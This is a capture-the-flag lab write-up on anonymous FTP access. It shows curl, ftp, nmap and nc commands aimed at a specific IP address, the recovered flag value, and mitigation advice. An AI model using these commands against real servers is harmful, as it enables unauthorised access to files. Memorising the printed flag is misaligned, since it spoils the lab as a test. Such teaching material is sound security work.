# HackDNA – FTP Anonymous Access Lab

## Challenge Overview

This lab demonstrates a common misconfiguration in FTP services where anonymous authentication is enabled. When improperly configured, attackers can access sensitive files without valid credentials.

FTP servers with anonymous access often expose internal files, backups, or flags in CTF environments.

---

# Objective

Connect to the FTP service using anonymous credentials and retrieve the hidden flag file.

---

# Understanding the Vulnerability

Anonymous FTP login allows users to access a server without a personal account.

If write or read permissions are misconfigured, attackers may:

* Download sensitive files
* Upload malicious content
* Enumerate directory structure
* Extract configuration data

---

# Reconnaissance

Identify that FTP service is available on the target IP:

```
34.245.169.217
```

Standard FTP port:

```
21/tcp
```

---

# Exploitation

Use `curl` to access the FTP server anonymously.

## Command

```bash
curl ftp://34.245.169.217/flag.txt --user anonymous:anonymous
```

---

# Result

The server returns the contents of the file:

```
358e3bff-6398-414f-b72b-e9cca1d5cbb7
```

This represents the retrieved flag from the FTP service.

---

# Alternative FTP Access

Using interactive FTP client:

```bash
ftp 34.245.169.217
```

Login credentials:

```text
Username: anonymous
Password: anonymous
```

Then list files:

```bash
ls
```

Download flag:

```bash
get flag.txt
```

---

# Impact

If anonymous FTP is enabled in production environments, attackers may:

* Access sensitive internal files
* Download configuration backups
* Retrieve credentials
* Upload malicious payloads
* Pivot into internal networks

---

# Root Cause

This vulnerability occurs due to:

* Enabled anonymous FTP login
* Weak access control configuration
* Improper file permission settings
* Lack of service hardening

---

# Detection Techniques

## Port Scanning

```bash
nmap -p 21 34.245.169.217
```

## FTP Banner Checking

```bash
nc 34.245.169.217 21
```

Look for banners indicating FTP service version.

---

# Mitigation

## Disable Anonymous Login

Ensure FTP servers do not allow unauthenticated access.

---

## Restrict File Permissions

Only authorized users should access sensitive directories.

---

## Use Secure Alternatives

Replace FTP with:

* SFTP (SSH File Transfer Protocol)
* FTPS (FTP Secure)

---

## Network Segmentation

Isolate file transfer services from public networks.

---

# Key Takeaway

Anonymous FTP access is a critical misconfiguration that can lead to unauthorized data exposure.

Any publicly accessible FTP service must be properly secured and authenticated.

---

# Vulnerability Classification

* CWE-306: Missing Authentication for Critical Function
* CWE-284: Improper Access Control
* OWASP A05:2021 – Security Misconfiguration

---

# Conclusion

This lab demonstrates how a simple misconfiguration in FTP services can expose sensitive files to attackers. Proper authentication and secure service configuration are essential to prevent unauthorized access.
